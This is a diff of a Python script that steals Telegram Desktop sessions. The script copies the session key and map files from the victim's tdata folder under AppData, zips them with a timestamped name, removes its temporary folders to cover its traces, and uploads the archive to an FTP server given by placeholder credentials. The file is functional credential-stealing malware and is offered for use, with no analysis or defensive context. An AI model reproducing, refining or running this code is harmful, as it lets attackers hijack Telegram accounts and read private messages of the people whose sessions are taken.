@@ -1,72 +1,80 @@
 import os
-import sys
-import shutil
-import zipfile
-import traceback
-from re import findall
-from zipfile import ZipFile
-from ftplib import FTP_TLS
-from ftplib import FTP
-import os, random
 import os.path
+import shutil
+import glob
+import time
+from datetime import time
+from datetime import datetime
+from ftplib import FTP
+from zipfile import ZipFile
 
+now = datetime.now()
+name_archive = str(now.strftime("%d_%m_%y_%I_%M"))
 
-
-#Searching path to file
+# Get current user home
 pathusr = os.path.expanduser('~')
-#Checking file
-file_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0'
+# Set tdata folder location
+tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
+tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"
+hash_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'
 
-way1 = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0' 
+# Creating folders
+os.mkdir(tdata_path + '\\connection_hash')
+os.mkdir(tdata_path + '\\map')
 
-found = os.path.exists(file_path)
+
+hash_map = glob.iglob(os.path.join(hash_path , "*"))
+for file in hash_map:
+    if os.path.isfile(file):
+        shutil.copy2(file, tdata_path + '\\map')
 
 
-with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip','w') as zipObj:
+#Copying files
+#If hash file has 15 letters
+files16 = glob.iglob(os.path.join(tdata_path , "??????????*"))
+for file in files16:
+    if os.path.isfile(file):
+        shutil.copy2(file, tdata_path + '\\connection_hash')
+        
+
+
+#Archivation folders
+with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\session.zip','w') as zipObj:
    # Iterate over all the files in directory
-   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\'):
+   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\map'):
        for filename in filenames:
            #create complete filepath of file in directory
            filePath = os.path.join(folderName, filename)
            # Add file to zip
            zipObj.write(filePath)
 
-#FTP module to connect server
+   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\connection_hash'):
+       for filename in filenames:
+           #create complete filepath of file in directory
+           filePath = os.path.join(folderName, filename)
+           # Add file to zip
+           zipObj.write(filePath)
+
+shutil.rmtree(tdata_path + '\\connection_hash')
+shutil.rmtree(tdata_path + '\\map')
+
+
+
+old_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
+new_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' , name_archive + ".zip")
+os.rename(old_file, new_file)
+
+
+# FTP module to connect server
 ftp = FTP()
 ftp.set_debuglevel(2)
-ftp.connect('Host of your FTP', 21) 
-ftp.login('Login for your FTP','Pass for your FTP')
-ftp.cwd('/folder where you want to save file on FTP server')
+ftp.connect('Name host', 21)
+ftp.login('Login', 'Password')
+ftp.cwd('/folder on your ftp server')
 
-
-if found == True :
-    telegram_zip = zipfile.ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata1.zip','w' )
-    telegram_zip.write(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0', compress_type=zipfile.ZIP_DEFLATED)
-    telegram_zip.close()
-    print(ftp.dir())
-    fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata1.zip', 'rb')
-    ftp.storbinary('STOR %s' % os.path.basename("tdata1.zip"), fp, 1024)
-    fp.close()
-    print('Ok!')
-
-else:
-    telegram_zip = zipfile.ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata2.zip','w')
-    telegram_zip.write(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C1', compress_type=zipfile.ZIP_DEFLATED)
-    telegram_zip.close()
-    print(ftp.dir())
-    fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata2.zip', 'rb')
-    ftp.storbinary('STOR %s' % os.path.basename("tdata2.zip"), fp, 1024)
-    fp.close()
-    print('Not ok!')
-
-
-
-#Sending file on FTP server
+# Sending file on FTP server
 print(ftp.dir())
-fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'rb')
-ftp.storbinary('STOR %s' % os.path.basename("tdata.zip"), fp, 1024)
+fp = open(tdata_session_zip, 'rb')
+ftp.storbinary('STOR %s' % os.path.basename(name_archive + ".zip"), fp, 1024)
 fp.close()
-
-
-
 
